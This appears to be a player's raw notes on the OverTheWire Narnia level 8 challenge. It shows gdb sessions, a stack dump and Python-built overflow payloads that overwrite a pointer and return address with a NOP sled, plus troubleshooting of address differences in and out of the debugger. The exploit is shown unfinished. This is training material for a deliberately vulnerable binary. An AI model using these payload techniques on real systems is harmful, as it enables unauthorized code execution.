vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
TMOUT=1800
MAIL=/var/mail/narnia8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
PWD=/home/narnia8
LANG=en_US.UTF-8
SHLVL=1
HOME=/home/narnia8
LOGNAME=narnia8
SSH_CONNECTION=172.18.0.1 54926 172.18.0.32 22
LESSOPEN=| /usr/bin/lesspipe %s
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/gdb

## same env as without gdb, theoretically. 
## Now going to simplify the payload because of the issues we were having with the breakpoint earlier

(gdb) b *0x080484a7
Breakpoint 1 at 0x80484a7
(gdb)  r $(python -c'print "A"*20+"\xb4\xd8\xff\xff"+"B"*12+"\xd0\xd6\xff\xff"+"\x90"*(64-16)')
Starting program: /narnia/narnia8 $(python -c'print "A"*20+"\xb4\xd8\xff\xff"+"B"*12+"\xd0\xd6\xff\xff"+"\x90"*(64-16)')

Breakpoint 1, 0x080484a7 in func ()
(gdb) x/200x $esp
0xffffd690:	0x08048580	0xffffd6a8	0x00000014	0xf7e55fe3
0xffffd6a0:	0x00000000	0x002c307d	0x41414141	0x41414141
0xffffd6b0:	0x41414141	0x41414141	0x41414141	0xffffd8b4
0xffffd6c0:	0x42424242	0x42424242	0x42424242	0xffffd6d0
0xffffd6d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd700:	0x00000002	0xffffd784	0xffffd724	0x080497a4
0xffffd710:	0x0804820c	0xf7fcc000	0x00000000	0x00000000
0xffffd720:	0x00000000	0x8be57c33	0xb3ddb823	0x00000000
0xffffd730:	0x00000000	0x00000000	0x00000002	0x08048330
0xffffd740:	0x00000000	0xf7ff04c0	0xf7e3c9e9	0xf7ffd000
0xffffd750:	0x00000002	0x08048330	0x00000000	0x08048351
0xffffd760:	0x080484ae	0x00000002	0xffffd784	0x080484f0
0xffffd770:	0x08048560	0xf7feb160	0xffffd77c	0x0000001c
0xffffd780:	0x00000002	0xffffd8a4	0xffffd8b4	0x00000000
0xffffd790:	0xffffd90d	0xffffd91d	0xffffd931	0xffffd950
0xffffd7a0:	0xffffd963	0xffffd96c	0xffffd979	0xffffde9a
0xffffd7b0:	0xffffdea5	0xffffdf03	0xffffdf1a	0xffffdf29
0xffffd7c0:	0xffffdf3b	0xffffdf4c	0xffffdf5f	0xffffdf67
0xffffd7d0:	0xffffdf77	0xffffdfa6	0xffffdfc6	0x00000000
0xffffd7e0:	0x00000020	0xf7fdbbe0	0x00000021	0xf7fdb000
0xffffd7f0:	0x00000010	0x178bfbff	0x00000006	0x00001000
0xffffd800:	0x00000011	0x00000064	0x00000003	0x08048034
0xffffd810:	0x00000004	0x00000020	0x00000005	0x00000008
0xffffd820:	0x00000007	0xf7fdc000	0x00000008	0x00000000
0xffffd830:	0x00000009	0x08048330	0x0000000b	0x000036b8
0xffffd840:	0x0000000c	0x000036b8	0x0000000d	0x000036b8
0xffffd850:	0x0000000e	0x000036b8	0x00000017	0x00000000
0xffffd860:	0x00000019	0xffffd88b	0x0000001f	0xffffdfe8
0xffffd870:	0x0000000f	0xffffd89b	0x00000000	0x00000000
0xffffd880:	0x00000000	0x00000000	0xe5000000	0x4e5c9539
0xffffd890:	0x3ce63a24	0x9e141f64	0x69fcaae5	0x00363836
0xffffd8a0:	0x00000000	0x72616e2f	0x2f61696e	0x6e72616e
0xffffd8b0:	0x00386169	0x41414141	0x41414141	0x41414141
0xffffd8c0:	0x41414141	0x41414141	0xffffd8b4	0x42424242
0xffffd8d0:	0x42424242	0x42424242	0xffffd6d0	0x90909090
0xffffd8e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd8f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd900:	0x90909090	0x90909090	0x90909090	0x45485300
0xffffd910:	0x2f3d4c4c	0x2f6e6962	0x68736162	0x52455400
0xffffd920:	0x74783d4d	0x2d6d7265	0x63363532	0x726f6c6f
0xffffd930:	0x48535300	0x494c435f	0x3d544e45	0x2e323731
0xffffd940:	0x302e3831	0x3520312e	0x36323934	0x00323220
0xffffd950:	0x5f485353	0x3d595454	0x7665642f	0x7374702f
0xffffd960:	0x4c00302f	0x4c415f43	0x00433d4c	0x52455355
0xffffd970:	0x72616e3d	0x3861696e	0x5f534c00	0x4f4c4f43
0xffffd980:	0x723d5352	0x3a303d73	0x303d6964	0x34333b31
0xffffd990:	0x3d6e6c3a	0x333b3130	0x686d3a36	0x3a30303d
0xffffd9a0:	0x343d6970	0x33333b30	0x3d6f733a	0x333b3130
(gdb)  r $(python -c'print "A"*20+"\xb4\xd8\xff\xff"+"B"*12+"\xe0\xd6\xff\xff"+"\x90"*(64-16)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c'print "A"*20+"\xb4\xd8\xff\xff"+"B"*12+"\xe0\xd6\xff\xff"+"\x90"*(64-16)')

Breakpoint 1, 0x080484a7 in func ()
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAA����BBBBBBBBBBBB����������������������������������������������������

Program received signal SIGSEGV, Segmentation fault.
0xffffd700 in ?? ()

## as we can see, the address for the loop changed from 0xffffd89f to 0xffffd8b4
## and the address for redirection changed from 0xffffd6b0 to 0xffffd6e0
## let's see if we get the same error outside of gdb

narnia8@narnia:~$ /narnia/narnia8 $(python -c'print "A"*20+"\xb4\xd8\xff\xff"+"B"*12+"\xd0\xd6\xff\xff"+"\x90"*(64-16)')
AAAAAAAAAAAAAAAAAAAA�B��

Shit... I must be missing something else...
I just double checked, env has 18 entries outside gdb; after the two unset commands, we have the same number in gdb... 
So it must be something else than the env...
I also noticed that the "_" variable was /usr/bin/env outside of gdb and /usr/bin/gdb inside, so I changed it to match. 
That moved the address a bit but didn't change the outcome outside gdb... 

===================== I found this xxd thing :) ===============================================
narnia8@narnia:~$ /narnia/narnia8 $(python -c'print "A"*20') |xxd
0000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0000010: 4141 4141 f5d8 ffff 020a                 AAAA......

The address we're looking for is outputted 0xffffd8f5

Now we add 4 bytes:
narnia8@narnia:~$ /narnia/narnia8 $(python -c'print "A"*20+"\xf1\xd8\xff\xff"') |xxd
0000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0000010: 4141 4141 f1d8 ffff 020a                 AAAA......
